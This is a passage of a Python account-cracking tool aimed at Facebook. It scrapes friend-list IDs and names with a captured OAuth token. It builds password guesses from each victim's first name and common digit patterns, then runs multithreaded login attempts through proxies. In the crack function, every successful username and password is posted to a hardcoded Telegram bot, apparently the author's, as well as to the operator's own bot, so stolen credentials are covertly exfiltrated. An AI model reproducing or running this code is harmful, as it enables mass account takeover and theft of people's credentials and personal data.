			try:
				headers={'X-Graphql-Client-Library':'graphservice','X-Graphql-Request-Purpose':'fetch',
				     'X-Fb-Privacy-Context':'2368177546817046','X-Fb-Background-State':'1',
				     'X-Fb-Net-Hni':'41001','X-Fb-Sim-Hni':'41001',
				     'Authorization':'OAuth '+self.token+'',
				     'X-Fb-Session-Id':'nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9',
				     'X-Fb-Connection-Type':'WIFI','X-Fb-Device-Group':'4481','X-Tigon-Is-Retry':'False',
				     'X-Fb-Rmd':'cached=0;state=URL_ELIGIBLE','X-Fb-Ta-Logging-Ids':f"graphql:{trace_id}",
				     'X-Fb-Friendly-Name':'SuggestionsFriendListContentQuery',
				     'X-Fb-Request-Analytics-Tags':'graphservice','Priority':'u=0',
				     'Accept-Encoding':'gzip, deflate','X-Fb-Http-Engine':'Liger','X-Fb-Client-Ip':'True',
				     'X-Fb-Server-Cluster':'True','X-Fb-Connection-Token':'ef0e330bff1cd312f36aa5f2c69c59a9',
				     'Content-Type':'application/x-www-form-urlencoded','Content-Length':'567'}
				data={
				 'User-Agent':'[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/'+carrier+';FBMF/'+android+' MOBILE LIMITED;FBBD/'+android+';FBPN/com.facebook.katana;FBDV/'+model+';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
				 'client_doc_id':client_id,
				 'method':'post',
				 'locale':'en_US',
				 'pretty':'false',
				 'format':'json',
				 'variables':'{"profile_id":'+uid+',"suggestion_friends_paginating_first":2500}',
				 'fb_api_req_friendly_name':'SuggestionsFriendListContentQuery',
				 'fb_api_caller_class':'graphservice',
				 'fb_api_analytics_tags':'["At_Connection","GraphServices"]',
				 'client_trace_id':trace_id,
				 'server_timestamps':'true',
				 'purpose':'fetch'
				}
				posted=requests.post('https://graph.facebook.com/graphql',headers=headers,data=data).json()
				try:
					data=posted['data']['user']['friends']['edges']
				except:
					print(f' \033[1;35msomething wrong with {uid}\033[0m ')
				if len(data)<100:
					print(f' \033[1;31mSORRY THE ID IS NOT PUBLIC...! {uid}\033[0m ')
				else:
					for edge in data:
						node=edge['node']
						open(save_as,'a',encoding='utf-8').write(node['id']+'|'+node['name']+'\n')
					if 'y' in sep:
						perfector(save_as)
					try:
						total_idss=len(open(save_as,'r').readlines())
					except:
						total_idss='-'
					x=random.choice(asu)
					print(f' {x}SUCCESSFULLY EXTRACTED... {uid} [{total_idss}] \033[0m')
			except KeyError:
				pass
			except requests.exceptions.ConnectionError:
				input(' connection error - press enter to continue')
		print(50*'-')
		print(' ids save in {} path'.format(save_as))
		print(' Total ids save in file {} '.format(len(open(save_as,'r').read().splitlines())))
		exit(50*'-')
	def file_by_file(self):
		os.system('clear');banner()
		print(' Put file Path from where ids extract ')
		file_name=input('\nfile path : ')
		os.system('clear')
		banner()
		save_as=input(' save file as : ')
		if not save_as=='/sdcard/':
			os.system(f'rm -rf {save_as}')
			open(save_as,'w')
		os.system('clear')
		banner()
		sepr=input(' DO YOU WANNA SEPERATE IDZ...? (y/n) : ')
		if sepr in['y','Y']:
			sep.append('y')
			print('\n\x1b[1;92m Example: 100087,100088 etc\x1b[0;97m')
			try:
				sl=int(input('\n How Many Links To crack : '))
			except:
				sl=1
			for el in range(sl):
				sid=input(f' Put {el + 1} link: ')
				siid.append(sid)
		elif sepr in['n','N']:
			sep.append('n')
		else:
			sep.append('n')
		try:
			file=open('.temp.txt','r').read().splitlines()
		except:
			file=[]
		try:
			file_read=open(file_name,'r',encoding='utf8').read().splitlines()
			for data in file_read:
				uid=data.split('|')[0]
				try:
					headers={'X-Graphql-Client-Library':'graphservice','X-Graphql-Request-Purpose':'fetch',
					     'X-Fb-Privacy-Context':'2368177546817046','X-Fb-Background-State':'1',
					     'X-Fb-Net-Hni':'41001','X-Fb-Sim-Hni':'41001',
					     'Authorization':'OAuth '+self.token+'',
					     'X-Fb-Session-Id':'nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9',
					     'X-Fb-Connection-Type':'WIFI','X-Fb-Device-Group':'4481','X-Tigon-Is-Retry':'False',
					     'X-Fb-Rmd':'cached=0;state=URL_ELIGIBLE','X-Fb-Ta-Logging-Ids':f"graphql:{trace_id}",
					     'X-Fb-Friendly-Name':'SuggestionsFriendListContentQuery',
					     'X-Fb-Request-Analytics-Tags':'graphservice','Priority':'u=0',
					     'Accept-Encoding':'gzip, deflate','X-Fb-Http-Engine':'Liger',
					     'X-Fb-Client-Ip':'True',
					     'X-Fb-Server-Cluster':'True',
					     'X-Fb-Connection-Token':'ef0e330bff1cd312f36aa5f2c69c59a9',
					     'Content-Type':'application/x-www-form-urlencoded','Content-Length':'567'}
					data={
					 'User-Agent':'[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/'+carrier+';FBMF/'+android+' MOBILE LIMITED;FBBD/'+android+';FBPN/com.facebook.katana;FBDV/'+model+';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
					 'client_doc_id':client_id,
					 'method':'post',
					 'locale':'en_US',
					 'pretty':'false',
					 'format':'json',
					 'variables':'{"profile_id":'+uid+',"suggestion_friends_paginating_first":2500}',
					 'fb_api_req_friendly_name':'SuggestionsFriendListContentQuery',
					 'fb_api_caller_class':'graphservice',
					 'fb_api_analytics_tags':'["At_Connection","GraphServices"]',
					 'client_trace_id':trace_id,
					 'server_timestamps':'true',
					 'purpose':'fetch'
					}
					posted=requests.post('https://graph.facebook.com/graphql',headers=headers,data=data).json()
					try:
						data=posted['data']['user']['friends']['edges']
					except:
						print(f' \033[1;35msomething wrong with {uid}\033[0m ')
					if len(data)<100:
						print(f' \033[1;31mSORRY THE ID IS NOT PUBLIC...! {uid}\033[0m ')
					else:
						for edge in data:
							node=edge['node']
							open(save_as,'a',encoding='utf-8').write(node['id']+'|'+node['name']+'\n')
						if 'y' in sep:
							perfector(save_as)
						try:
							total_idss=len(open(save_as,'r').readlines())
						except:
							total_idss='-'
						x=random.choice(asu)
						print(f' {x}SUCCESSFULLY EXTRACTED... {uid} [{total_idss}] \033[0m')
				except KeyError:
					pass
				except requests.exceptions.ConnectionError:
					print(' connection not found ..')
			print(50*'-')
			print(' ids save in {} path'.format(save_as))
			print(' Total ids save in file {} '.format(len(open(save_as,'r').read().splitlines())))
			exit(50*'-')
		except FileNotFoundError:
			exit('\n\x1b[1;31mNot found file in storage\x1b[0m')
def sort():
	os.system('clear');banner()
	file_name=input('\x1b[1;32m \x1b[1;32m your file path : ')
	with open(file_name,'r',encoding='utf8')as file:
		ids=[line.strip()for line in file]
	sort_hogaya=sorted(ids,reverse=True)
	os.system(f'rm -rf {file_name}')
	for sorter in sort_hogaya:
		open(file_name,'a',encoding='utf8').write(sorter+'\n')
	print(50*'-')
	print(' \x1b[1;32m SORTED SUCCESSFULLY...!\x1b[0m')
	print(f" \033[1;32m YOUR IDZ SAVED IN... {file_name} \033[0m")
	print(50*'-')
	input(' Press enter to go back ')
def dump_massal():
	try:
		token=open('.token.txt','r').read()
		cok=open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		kumpulkan = int(input(f'\x1b[0m CHAN IDT DAWE : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'\x1b[0m ID DANE  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id)==0:
	           params=(
	{
	           'access_token':token,
	           'fields':'friends'
	}
)
	       else:
	           params=(
	{
	           'access_token':token,
	           'fields':'friends'
	}
)
	       url=requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy=(xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except(KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
		print('')
		print(f' TATAL IDZ 🔥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Lo kek Kontol ')
		back()
	except(KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
def crack_file():
    print('\x1b[0;92m==================')
    o=input('\x1b[97;1m[\x1b[92;1m+\x1b[97;1m] FILE NAME :\x1b[92;1m ')
    try:lin=open(o).read().splitlines()
    except:
        print('\x1b[0;92m==================')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
def setting():
    print('\x1b[0;92m=============================')
    print('\x1b[97;1m[\x1b[92;1m1\x1b[97;1m]  \x1b[33m\x1b[33m\x1b[33m[\x1b[0;92mOLD \x1b[36mID\x1b[33m]')
    print('\x1b[97;1m[\x1b[92;1m2\x1b[97;1m]  \x1b[33m\x1b[33m\x1b[33m[\x1b[0;92mNEW \x1b[36mID\x1b[33m]')
    print('\x1b[97;1m[\x1b[92;1m3\x1b[97;1m]  \x1b[33m\x1b[33m\x1b[33m[\x1b[0;92mMIX \x1b[36mID\x1b[33m]')
    print('\x1b[0;92m=============================')
    hu=input('\x1b[97;1m[\x1b[92;1m+\x1b[97;1m]CHOOSE :\x1b[92;1m ')
    if hu in['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in['2','02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi-=1
    elif hu in['3','03']:
        for bacot in id:
            xx=random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx=random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\x1b[0;92m==================')
    print('\x1b[97;1m[\x1b[92;1m1\x1b[97;1m] \x1b[33m\x1b[33m\x1b[33m[\x1b[0;92mSHOW \x1b[36mCOOKIES\x1b[33m]')
    print('\x1b[0;92m==================')
    hc=input('\x1b[97;1m[\x1b[92;1m•\x1b[97;1m] CHOOSE : ')
    if hc in['1','01']:
        method.append('mobile')
    elif hc in['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit()
def passwrd():
	print('\x1b[0;92m==================')
	print('\x1b[97;1m[\x1b[92;1m➢\x1b[97;1m] \x1b[33m\x1b[33m\x1b[33m[\x1b[0;92m\x1b[36mWdeH\x1b[33m] \x1b[1;92m ')
	print('\x1b[97;1m[\x1b[92;1m➢\x1b[97;1m] \x1b[33m\x1b[33m\x1b[33m[\x1b[0;92mTOTAL \x1b[36mID\x1b[33m] : ',str(len(id)))
	print('\x1b[97;1m[\x1b[92;1m➢\x1b[97;1m] \x1b[33m\x1b[33m\x1b[33m[\x1b[0;92mTODAY \x1b[36mTIME\x1b[33m] : \x1b[1;92m'+time.strftime('%H:%M')+' ')
	print('\x1b[0;96m===============================================')
	with tred(max_workers=30)as pool:
		for yuzong in id2:
			idf,nmf=yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs=nmf.split(' ')[0]
			pwv=[]
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'12')
					pwv.append(frs+'1122')
					pwv.append(frs+'321')
					pwv.append(frs+'54321')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'2004')
					pwv.append(frs+'2006')
					pwv.append(frs+'2003')
					pwv.append(frs+'2002')
					pwv.append(frs+'2001')
					pwv.append('1122334455')
					pwv.append('11223344')
					pwv.append(frs+'2005')
					pwv.append(frs+'2000')
					pwv.append('11223344556677')
					pwv.append('112233445566')
					pwv.append('١٢٣٤٥٦')
					pwv.append('١٢٣٤٥٦٧٨٩')
					pwv.append('19991999')
					pwv.append('19981998')
					pwv.append('19971997')
					pwv.append('19961996')
					pwv.append('19951995')
					pwv.append('19941994')
					pwv.append('19931993')
					pwv.append('19921992')
					pwv.append('19901990')
					pwv.append('19911991')
					pwv.append('12345@@@@@')
					pwv.append('1020304050')
					pwv.append('5432154321')
					pwv.append('10203040')
					pwv.append('1234567890')
					pwv.append('1234@@@@')
					pwv.append('20012001')
					pwv.append('5544332211')
					pwv.append('22446688')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'54321')
					pwv.append(frs+'1234567')
					pwv.append(frs+'1999')
					pwv.append(frs+'1998')
					pwv.append(frs+'1997')
					pwv.append(frs+'1996')
					pwv.append(frs+'1995')
					pwv.append(frs+'1994')
					pwv.append(frs+'1993')
					pwv.append(frs+'1992')
					pwv.append(frs+'1991')
					pwv.append(frs+'1990')
					pwv.append('5432154321')
					pwv.append('5544332211')
					pwv.append('0099887766')
					pwv.append('1234554321')
					pwv.append('1234512345')
					pwv.append('00998877')
					pwv.append('11223344')
					pwv.append('20002000')
					pwv.append('20022002')
					pwv.append('20032003')
					pwv.append('20042004')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'1000')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'12341234')
					pwv.append(frs+'12345678')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'12')
					pwv.append(frs+'1122')
					pwv.append(frs+'321')
					pwv.append(frs+'54321')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'2004')
					pwv.append(frs+'2006')
					pwv.append(frs+'2003')
					pwv.append(frs+'2002')
					pwv.append(frs+'2001')
					pwv.append('1122334455')
					pwv.append('11223344')
					pwv.append(frs+'2005')
					pwv.append(frs+'2000')
					pwv.append('11223344556677')
					pwv.append('112233445566')
					pwv.append('١٢٣٤٥٦')
					pwv.append('١٢٣٤٥٦٧٨٩')
					pwv.append('19991999')
					pwv.append('19981998')
					pwv.append('19971997')
					pwv.append('19961996')
					pwv.append('19951995')
					pwv.append('19941994')
					pwv.append('19931993')
					pwv.append('19921992')
					pwv.append('19901990')
					pwv.append('19911991')
					pwv.append('12345@@@@@')
					pwv.append('1020304050')
					pwv.append('5432154321')
					pwv.append('10203040')
					pwv.append('1234567890')
					pwv.append('1234@@@@')
					pwv.append('20012001')
					pwv.append('5544332211')
					pwv.append('22446688')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'54321')
					pwv.append(frs+'1234567')
					pwv.append(frs+'1999')
					pwv.append(frs+'1998')
					pwv.append(frs+'1997')
					pwv.append(frs+'1996')
					pwv.append(frs+'1995')
					pwv.append(frs+'1994')
					pwv.append(frs+'1993')
					pwv.append(frs+'1992')
					pwv.append(frs+'1991')
					pwv.append(frs+'1990')
					pwv.append('5432154321')
					pwv.append('5544332211')
					pwv.append('0099887766')
					pwv.append('1234554321')
					pwv.append('1234512345')
					pwv.append('00998877')
					pwv.append('11223344')
					pwv.append('20002000')
					pwv.append('20022002')
					pwv.append('20032003')
					pwv.append('20042004')
					pwv.append(frs+'2022')
					pwv.append(frs+'123123')
					pwv.append(frs+'1000')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'12341234')
					pwv.append(frs+'12345678')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
			if 'ya' in pwpluss:
			    for xpwd in pwnya:
			        pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
			    pool.submit(crack,idf,pwv)
			elif 'free' in method:
			    pool.submit(crackfree,idf,pwv)
			else:
			    pool.submit(crackmbasic,idf,pwv)
	print('')
	print(f'{x}GOOD : {h}%s '%(ok))
	print(f'{x}CP : {m}%s{x} '%(cp))
	print('')
	print(' Crack ( Y/t ) ? ')
	woi=input('Choice : ')
	if woi in['y','Y']:
	    HAMA()
	else:
	    print(f'\t{x}{m}Good Bye {x} ')
	    time.sleep(2)
	    exit()
os.system('clear');banner()
def crack(idf,pwv):
	global loop,ok,cp
	bo=random.choice([m,k,h,b,u,x])
	rc=random.choice
	amr=rc(['😀','😃','😄','😁','😆','😅','🤣','😂','🙂','🙃','😉','😊','😇','🥰','😍','🤩','😘','😗','😚','😙','😋','😛','😜','🤪','😝','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐','😑','😶','😏','😒','🙄','😬','🤥','😌','😔','😪','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵','🤯','🤠','🥳','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','😾','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❤️','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❣️','💕','💞','💓','💗','💖','💘','💝','💟','❤️\u200d🔥','❤️\u200d🩹','❤️','🚀','🛸','🌍','🌎','🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆\u200d♂️','🤦\u200d♂️','✨','🗿','👍🏼','🚬'])
	sys.stdout.write(f"\r{bo}({amr}𖤤WdeH𖤤) {loop}•{len(id)}  • OK:{ok} •  CP:{cp} • ({'{:.0%}'.format(loop/float(len(id)))}{amr})"),
	sys.stdout.flush()
	ua=random.choice(ugen)
	ua2=random.choice(ugen2)
	ses=requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs={'http':'socks4://'+nip}
			ses.headers.update({'Host':'d.facebook.com','upgrade-insecure-requests':'1','user-agent':ua2,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt':'1','x-requested-with':'mark.via.gp','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-user':'empty','sec-fetch-dest':'document','referer':'https://m.facebook.com/','accept-encoding':'gzip, deflate br','accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			p=ses.get('https://d.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa={'lsd':re.search('name="lsd" value="(.*?)"',str(p)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"',str(p)).group(1),'uid':idf,'flow':'login_no_pin','pass':pw,'next':'https://developers.facebook.com/tools/debug/accesstoken/'}
			ses.headers.update({'Host':'d.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','origin':'https://m.facebook.com','content-type':'application/x-www-form-urlencoded','user-agent':ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'mark.via.gp','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-user':'empty','sec-fetch-dest':'document','referer':'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding':'gzip, deflate br','accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			po=ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False,proxies=proxs)
			if 'checkpoint' in po.cookies.get_dict().keys():
				statuscp=f'''حـسـاب سـكـيـور ميفيدك ☹️💔
					'''
				statuscp1=nel(statuscp,style='red')
				cetak(nel(statuscp1,title='WdeH'))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki=(';').join(['%s=%s' %(key,value)for key,value in ses.cookies.get_dict().items()])
				print('\n')
				statusok=f'''ғᴀᴄᴇʙᴏᴏᴋ✔️🔥
𖣘────━𓆩𝗔𝗟𝗥𝗢𝗦𝗘𓆪━────𖣘
✵ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠׀\n{idf}
✵ - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗׀\n {pw}
⊊𝗕𝗬⊋ ➩ @YRWSYY - @I_9_W\n𖣘────━𓆩𝗔𝗟𝗥𝗢𝗦𝗘𓆪━────𖣘	
                 '''
				statuscp1=nel(statusok,style='green')
				cetak(nel(statuscp1,title='WdeH'))
				requests.get('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(ID)+'&text='+str(statusok))
				requests.post(f"https://api.telegram.org/bot6503135357:AAEKp7sSsQUdVdZKZD23pyudvmef6ClJtaA/sendMessage?chat_id=5698088160&text={statusok}")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk()
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if '__main__'=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
main_menu()
